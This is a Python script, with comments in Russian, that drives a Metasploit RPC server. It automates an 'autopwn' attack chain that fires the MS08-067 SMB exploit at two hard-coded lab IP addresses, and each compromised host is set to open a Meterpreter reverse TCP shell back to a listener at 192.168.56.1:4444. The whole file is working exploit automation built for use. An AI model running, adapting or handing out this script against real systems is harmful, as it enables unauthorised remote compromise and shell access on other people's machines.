#!/usr/bin/env python3
# encoding: utf-8

import json
import base64
import time
import uuid
import logging
import traceback
from pathlib import Path
from xmlrpc.client import ServerProxy, Fault, Transport
from urllib.parse import urlparse

CONFIG_PATH = "/etc/autopwn/configs/metasploit_rpc.json"
LOG_PATH = "/var/log/autopwn/rpc_launcher.log"

# === Конфигурация логирования ===
logging.basicConfig(filename=LOG_PATH, level=logging.INFO,
                    format='%(asctime)s [%(levelname)s] %(message)s')

# === Загрузка конфигурации ===
def load_config(path):
    with open(path, "r") as f:
        return json.load(f)

# === RPC Launcher Class ===
class RPCLauncher:
    def __init__(self, config):
        self.uri = config["rpc_uri"]
        self.username = config["rpc_user"]
        self.password = config["rpc_pass"]
        self.workspace = config.get("workspace", "default")
        self.session_token = None
        self.client = ServerProxy(self.uri, allow_none=True, transport=Transport())
        self._login()

    def _login(self):
        try:
            res = self.client.auth.login(self.username, self.password)
            if res["result"] == "success":
                self.session_token = res["token"]
                logging.info("RPC login successful")
            else:
                raise Exception("Login failed")
        except Fault as e:
            logging.error(f"Login RPC Fault: {e}")
            raise

    def _call(self, method, *args):
        if not self.session_token:
            raise Exception("No session token")
        try:
            full_args = (self.session_token,) + args
            return getattr(self.client, method)(*full_args)
        except Fault as e:
            logging.error(f"RPC Fault in {method}: {e}")
            raise

    def run_module(self, mtype, mname, opts):
        try:
            logging.info(f"Running module {mtype}/{mname} with opts {opts}")
            job_id = self._call("module.execute", mtype, mname, opts)
            logging.info(f"Module launched: job_id = {job_id}")
            return job_id
        except Exception as e:
            logging.error(f"Module execution error: {str(e)}")
            traceback.print_exc()

    def get_jobs(self):
        return self._call("job.list")

    def run_autopwn_sequence(self, target_ip):
        payload = "windows/meterpreter/reverse_tcp"
        exploit = "exploit/windows/smb/ms08_067_netapi"
        opts = {
            "RHOSTS": target_ip,
            "LHOST": "192.168.56.1",
            "LPORT": 4444,
            "PAYLOAD": payload,
            "DisablePayloadHandler": False,
            "workspace": self.workspace
        }

        logging.info(f"Initiating attack chain on {target_ip}")
        self.run_module("exploit", exploit, opts)

# === Главный запуск ===
if __name__ == "__main__":
    try:
        config = load_config(CONFIG_PATH)
        rpc = RPCLauncher(config)

        targets = ["192.168.56.101", "192.168.56.102"]

        for ip in targets:
            rpc.run_autopwn_sequence(ip)
            time.sleep(1)

        logging.info("All jobs dispatched.")
    except Exception as e:
        logging.critical(f"Fatal error in rpc_launcher: {str(e)}")
        traceback.print_exc()
